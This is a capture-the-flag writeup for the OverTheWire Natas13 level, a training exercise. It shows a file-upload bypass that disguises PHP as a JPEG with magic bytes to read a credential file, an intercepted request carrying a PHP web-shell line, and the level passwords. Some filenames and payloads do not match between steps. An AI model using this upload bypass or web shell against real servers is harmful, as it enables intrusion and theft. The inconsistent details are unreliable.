# CTF Writeup - **OverTheWire Natas12 - Natas13**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas12 - Natas13
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 11-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use inspect element to troubleshoot and find the flag.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas13
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
URL:      http://natas13.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for image as input.  But we dont know anything about it, So lets input some random image and check it out. 

```bash
For security reasons, we now only accept image files!
Choose a JPEG to upload (max 1KB):
|Choose File|  No file chosen
Upload File  
```

Now we need to find the image to input to get the flag. Let view the source code. 

```bash
<?php

# function genRandomString() {
#     $length = 10;
#     $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
#     $string = "";

#     for ($p = 0; $p < $length; $p++) {
#         $string .= $characters[mt_rand(0, strlen($characters)-1)];
#     }

#     return $string;
# }

# function makeRandomPath($dir, $ext) {
#     do {
#     $path = $dir."/".genRandomString().".".$ext;
#     } while(file_exists($path));
#     return $path;
# }

# function makeRandomPathFromFilename($dir, $fn) {
#     $ext = pathinfo($fn, PATHINFO_EXTENSION);
#     return makeRandomPath($dir, $ext);
# }

# if(array_key_exists("filename", $_POST)) {
#     $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

#     $err=$_FILES['uploadedfile']['error'];
#     if($err){
#         if($err === 2){
#             echo "The uploaded file exceeds MAX_FILE_SIZE";
#         } else{
#             echo "Something went wrong :/";
#         }
#     } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
#         echo "File is too big";
#     } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
#         echo "File is not an image";
#     } else {
#         if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
#             echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
#         } else{
#             echo "There was an error uploading the file, please try again!";
#         }
#     }
# } else {
# ?>
```

We can see that there is a form which takes our input, and when we submit the input there is a php code which gets executed on the input, Where there are 3 main function, `genRandomString` is the function that has generates a random string with 10 characters. `makeRandomPath` function takes the directory and the files extension and then creates the path with the random string for example `upload/12345abcde.jpg` file is created. `makeRandomPathFromFilename` whenever the files is uploaded this funciton creates a path in the directory with the previous funciton and then copies the uploaded file to that path. We can see that in the `html` there is some check for jpg files. This is interesting for us, as we can now upload a php code as if it was a jpg file. `exif_imagetype` command is particularly interesting as i found out that this function reads the first 4 bytes of a file to determine if its jpg file or not. We can take advantage of this by writing the 4 bytes that the function expects to the php file as shown below where `0xFF, 0xD8, 0xFF, 0xE0` are the first 4 bytes. The next thing we need is the password that is stored int the  `/etc/natas_webpass/natas14`, for that we can also append another code as shown below. It will print the password whenever it gets executed. 

```bash
# Create a php file with using command line(Below commands are for windows).
powershell -Command "[IO.File]::WriteAllBytes('abc.php', [byte[]](0xFF, 0xD8, 0xFF, 0xE0))"
'<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' | Out-File -FilePath abc.php -Append -Encoding ascii

# Create a php file with using command line(Below commands are for Linux).
echo -e "\xFF\xD8\xFF\xE0" > image.php
echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> image.php

```

Now, that we have the php file which resembles jpg, we can upload this file to the server and try to get the password of the next level. Before uploading we need to check how its sent to the server so start the burpsuite with the intercept on and then upload the file and submit it. We can see that the file is getting saved as `zzkcpd7s0d.jpg` so we need to change it as `zzkcpd7s0d.php` before forwarding. 

```bash
# POST /index.php HTTP/1.1
# Host: natas12.natas.labs.overthewire.org
# Content-Length: 461
# Cache-Control: max-age=0
# Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
# Accept-Language: en-US,en;q=0.9
# Origin: http://natas13.natas.labs.overthewire.org
# Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysR3wS37InhEs5eFb
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Referer: http://natas12.natas.labs.overthewire.org/
# Accept-Encoding: gzip, deflate, br
# Connection: keep-alive

# ------WebKitFormBoundarysR3wS37InhEs5eFb
# Content-Disposition: form-data; name="MAX_FILE_SIZE"

# 1000
# ------WebKitFormBoundarysR3wS37InhEs5eFb
# Content-Disposition: form-data; name="filename"

 zzkcpd7s0d.jpg
# ------WebKitFormBoundarysR3wS37InhEs5eFb
# Content-Disposition: form-data; name="uploadedfile"; filename="abc.php"
# Content-Type: application/octet-stream

# <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
# ------WebKitFormBoundarysR3wS37InhEs5eFb--
```

After forward the request we can see that the `The file upload/v6lm2uilp9.php has been uploaded` message getting displayed. Now lets try to access this php file through the browser by clicking the uploaded file. Once we do that we can see that the url is `http://natas13.natas.labs.overthewire.org/upload/v6lm2uilp9.php` and the message is `����z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`. Here it is very clear that the first 4 bytes are the data that we appended in the php to make it similar to jpg, and the next few charaters are the contents of the `/etc/natas_webpass/natas14`.


```bash
http://natas13.natas.labs.overthewire.org/upload/63soe1oshi.php
# The password for natas14 is z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

## Flag

**Flag:** z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

---

## Lessons Learned

It was a very hard challenge. It took me more time to understand and it was also a pain as the php is deleted by the antivirus. 